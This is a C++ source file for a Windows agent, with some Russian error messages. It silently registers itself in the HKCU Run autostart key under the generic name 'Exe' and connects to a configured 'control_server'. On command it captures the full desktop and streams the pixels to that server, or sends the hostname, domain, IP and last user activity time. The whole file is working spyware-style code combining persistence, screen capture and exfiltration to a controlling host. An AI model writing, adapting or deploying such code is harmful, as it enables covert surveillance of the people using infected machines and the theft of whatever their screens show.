#include <iostream>
#include "Client.h"
#include "ConfigReader.h"
#include <algorithm>
#include <iostream>
#include <Lmwksta.h>
#include <StrSafe.h>
#include <vector>
#include <thread>
#include <chrono>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <locale>
#include <codecvt>

using namespace std;

int generator = 1;
wstring screenshot(wstring creanshot_dir)
{
    HWND window = GetDesktopWindow();
    RECT windowRect;
    GetWindowRect(window, &windowRect);

    int bitmap_dx = windowRect.right - windowRect.left;
    int bitmap_dy = windowRect.bottom - windowRect.top;

    BITMAPINFOHEADER bmpInfoHeader;
    BITMAPFILEHEADER bmpFileHeader;
    BITMAP* pBitmap;

    bmpFileHeader.bfType = 0x4d42;
    bmpFileHeader.bfSize = 0;
    bmpFileHeader.bfReserved1 = 0;
    bmpFileHeader.bfReserved2 = 0;
    bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    bmpInfoHeader.biSize = sizeof(bmpInfoHeader);
    bmpInfoHeader.biWidth = bitmap_dx;
    bmpInfoHeader.biHeight = bitmap_dy;
    bmpInfoHeader.biPlanes = 1;
    bmpInfoHeader.biBitCount = 24;
    bmpInfoHeader.biCompression = BI_RGB;
    bmpInfoHeader.biSizeImage = bitmap_dx * bitmap_dy * (24 / 8);
    bmpInfoHeader.biXPelsPerMeter = 0;
    bmpInfoHeader.biYPelsPerMeter = 0;
    bmpInfoHeader.biClrUsed = 0;
    bmpInfoHeader.biClrImportant = 0;

    BITMAPINFO info;
    info.bmiHeader = bmpInfoHeader;

    BYTE* memory;
    HDC winDC = GetWindowDC(window);
    HDC bmpDC = CreateCompatibleDC(winDC);

    HBITMAP bitmap = CreateDIBSection(winDC, &info, DIB_RGB_COLORS, (void**)&memory, NULL, 0);
    SelectObject(bmpDC, bitmap);
    BitBlt(bmpDC, 0, 0, bitmap_dx, bitmap_dy, winDC, 0, 0, SRCCOPY);
    ReleaseDC(window, winDC);
    wstring path = creanshot_dir + L"\\" + to_wstring(generator++) + L".bmp";

    HANDLE hFile = CreateFile(
        path.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return L"";

    DWORD dwWritten = 0;
    WriteFile(hFile, &bmpFileHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &bmpInfoHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, memory, bmpInfoHeader.biSizeImage, &dwWritten, NULL);
    CloseHandle(hFile);

    return path;
}

string getPCName() {
    char pcName[200];
    unsigned long pcNameLen = 200;
    GetComputerNameA(pcName, &pcNameLen);
    return string(pcName);
}

string getPCDomain() {
    CHAR domain[MAX_PATH];
    DWORD size = MAX_PATH;
    string domainName = "";
    if (GetComputerNameExA(ComputerNameDnsDomain, domain, &size))
        domainName = domain;
    return domainName;
}

wstring getExecProgramPath() {
    vector<wchar_t> pathBuffer(MAX_PATH);
    DWORD length = GetModuleFileName(nullptr, pathBuffer.data(), static_cast<DWORD>(pathBuffer.size()));

    if (length == 0 || length == pathBuffer.size()) {
        return L"";
    }

    return wstring(pathBuffer.begin(), pathBuffer.begin() + length);
}

bool addToAurorun(const wstring& programName, const wstring& executablePath) {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueEx(hKey, 
        programName.c_str(),
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(executablePath.c_str()),
        (executablePath.size() + 1) * sizeof(wchar_t));
    if (result != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

string getLastUserActivityTime() {
    LASTINPUTINFO lii;
    auto tp = chrono::system_clock::now();

    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        DWORD idleTimeMs = GetTickCount() - lii.dwTime;
        auto now = chrono::system_clock::now();
        auto nowMs = chrono::time_point_cast<chrono::milliseconds>(now);
        tp = nowMs - chrono::milliseconds(idleTimeMs);
    }

    auto timeT = chrono::system_clock::to_time_t(tp);
    tm localTime;
    localtime_s(&localTime, &timeT);
    ostringstream oss;
    oss << put_time(&localTime, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

string getHostIp() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return "";
    }

    char hostName[256];
    if (gethostname(hostName, sizeof(hostName)) == SOCKET_ERROR) {
        std::cerr << "gethostname failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return "";
    }

    addrinfo hints = {};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo* addrInfo = nullptr;
    addrinfo* p = nullptr;
    std::string ipAddress;

    if (getaddrinfo(hostName, nullptr, &hints, &addrInfo) != 0) {
        std::cerr << "getaddrinfo failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return "";
    }

    for (p = addrInfo; p != nullptr; p = p->ai_next) {
        char ipString[INET6_ADDRSTRLEN];
        if (p->ai_family == AF_INET) {
            sockaddr_in* ipv4 = reinterpret_cast<sockaddr_in*>(p->ai_addr);
            inet_ntop(p->ai_family, &(ipv4->sin_addr), ipString, sizeof(ipString));
        }
        else if (p->ai_family == AF_INET6) {
            sockaddr_in6* ipv6 = reinterpret_cast<sockaddr_in6*>(p->ai_addr);
            inet_ntop(p->ai_family, &(ipv6->sin6_addr), ipString, sizeof(ipString));
        }
        else {
            continue;
        }

        ipAddress = ipString;
        break;
    }

    freeaddrinfo(addrInfo);
    WSACleanup();

    return ipAddress;
}

std::string wstrToStr(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

vector<string> bmpToVector(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Не удалось открыть файл." << std::endl;
        return {};
    }

    BITMAPFILEHEADER fileHeader;
    file.read(reinterpret_cast<char*>(&fileHeader), sizeof(fileHeader));
    if (fileHeader.bfType != 0x4D42) {
        std::cerr << "Неверный формат BMP-файла." << std::endl;
        return {};
    }

    BITMAPINFOHEADER infoHeader;
    file.read(reinterpret_cast<char*>(&infoHeader), sizeof(infoHeader));

    if (infoHeader.biBitCount != 24) {
        std::cerr << "Поддерживаются только 24-битные BMP-файлы." << std::endl;
        return {};
    }

    int width = infoHeader.biWidth;
    int height = infoHeader.biHeight;
    int rowStride = (width * 3 + 3) & ~3;
    int dataSize = rowStride * height;

    file.seekg(fileHeader.bfOffBits, std::ios::beg);

    std::vector<std::string> result(height);
    std::vector<uint8_t> rowBuffer(rowStride);

    for (int y = height - 1; y >= 0; --y) {
        file.read(reinterpret_cast<char*>(rowBuffer.data()), rowStride);

        std::string row;
        for (int x = 0; x < width; ++x) {
            uint8_t blue = rowBuffer[x * 3];
            uint8_t green = rowBuffer[x * 3 + 1];
            uint8_t red = rowBuffer[x * 3 + 2];
            row += std::to_string(red) + "," + std::to_string(green) + "," + std::to_string(blue) + " ";
        }
        result[y] = row;
    }

    file.close();
    return result;
}

int main() {
    addToAurorun(L"Exe", getExecProgramPath());

    ConfigReader cr;
    auto conf = cr.read("config.txt");

    string server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
    int server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());
    string screenshot_dir = conf["screenshot_dir"];
    string host_name = getPCName();
    string host_domain_name = getPCDomain();
    string lastActiveTime = getLastUserActivityTime();
    string host_ip = getHostIp();

    if (host_domain_name.length() == 0) {
        host_domain_name = "no domain";
    }

    while (true) {

        TCPClient* client = new TCPClient(server_ip, server_port);
        client->connect();

        while (true) {
            try {
                string command = client->receiveMessage();
                cout << command << endl;

                if (command == "GET_SCREENSHOT") {
                    string screen_path = wstrToStr(screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end())));
                    auto data = bmpToVector(screen_path);
                    client->sendMessage("SCREENSHOT_START");
                    for (auto line : data) {
                        client->sendMessage(line);
                    }
                    client->sendMessage("SCREENSHOT_END");

                }
                else if (command == "GET_STATE") {
                    string info = "";
                    info += "hostname: " + host_name + "\n";
                    info += "domain: " + host_domain_name + "\n";
                    info += "last_activ_time: " + getLastUserActivityTime() + "\n";
                    info += "ip: " + host_ip + "\n";

                    client->sendMessage("STATE START");
                    client->sendMessage(info);
                    client->sendMessage("STATE END");
                }
            }
            catch (const std::exception& e) {
                delete client;
                break;
            }
        }

    }
}